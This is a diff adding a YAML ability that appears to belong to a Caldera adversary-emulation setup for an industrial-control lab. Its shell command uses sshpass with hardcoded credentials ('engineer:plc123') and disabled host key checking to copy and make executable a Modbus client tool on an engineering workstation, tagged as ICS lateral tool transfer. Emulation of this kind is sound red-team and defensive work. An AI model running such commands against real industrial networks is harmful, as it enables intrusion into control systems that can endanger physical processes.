@@ -1,0 +1,23 @@
+---
+
+- id: a9b8c7d6-1010-1010-1010-000000000002
+  name: SCP modbus_cli from Kali to EWS over SSH
+  description: |
+    Copies ./modbus_cli (from prior Caldera payload download on Kali) to /tmp/modbus_cli
+    on 192.168.95.5 using engineer:plc123. Run e5f6a7b8-5555-5555-5555-000000000002 first.
+  tactic: lateral-movement
+  technique_id: T0867
+  technique_name: Lateral Tool Transfer
+  executors:
+  - platform: linux
+    name: sh
+    command: >
+      test -x ./modbus_cli ||
+      { echo "ERROR: ./modbus_cli missing — run Lateral Transfer Modbus CLI download first"; exit 1; } &&
+      command -v sshpass >/dev/null 2>&1 || { echo "ERROR: sshpass required"; exit 1; } &&
+      sshpass -p 'plc123' scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null
+      ./modbus_cli engineer@192.168.95.5:/tmp/modbus_cli &&
+      sshpass -p 'plc123' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null
+      engineer@192.168.95.5 'chmod +x /tmp/modbus_cli && ls -la /tmp/modbus_cli' &&
+      echo "SCP_TO_EWS_DONE"
+    timeout: 120
